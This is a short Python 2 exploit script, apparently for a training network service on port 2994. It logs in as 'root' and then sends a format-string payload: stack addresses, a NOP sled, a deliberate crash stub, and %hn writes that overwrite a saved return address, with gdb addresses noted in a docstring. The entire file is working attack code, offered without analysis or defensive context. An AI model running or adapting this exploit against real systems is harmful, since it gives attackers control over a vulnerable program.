#!/usr/bin/python

'''
my buffer at 0xbffff720
0x080498f0 <logit+86>:  ret
(gdb) x/x $esp
0xbffff70c:     0x080499ef
'''
from socket import *
from struct import pack
from sys import argv

PORT = 2994
def main(host):

	s = socket()
	s.connect((host, PORT))
	l = s.recv(1024)
	print l
	p = "username root\n"
	print "[+] send %d byte" % len(p)
	s.send(p)
	# now username array contain "root"
	# and we can continue to login func
	s.recv(1024)
	
	# now we can exploit the bug.
	# "Login from 10.0.0.4:54417 as [root] with password [here is our exploit]\n"
	p = "login A"
	p += pack("<I", 0xbffff70e) # write first 2 byte
	p += pack("<I", 0xbffff70c) # write last 2 byte
	p += "\x90"*70 # start of shellcode
	p += "\x33\xD2\x89\x12\x90" #some exception - xor edx,edx mov [edx], edx
	p += "\x90"*5
	p += "%49011x%20$hn"
	p += "%14129x%21$hn\n"
	s.send(p)
	l = s.recv(1024)
	print l


if __name__ == '__main__':
	if len(argv) < 2:
		print "usage : %s <host>" % argv[0]
	else:
		main(argv[1])
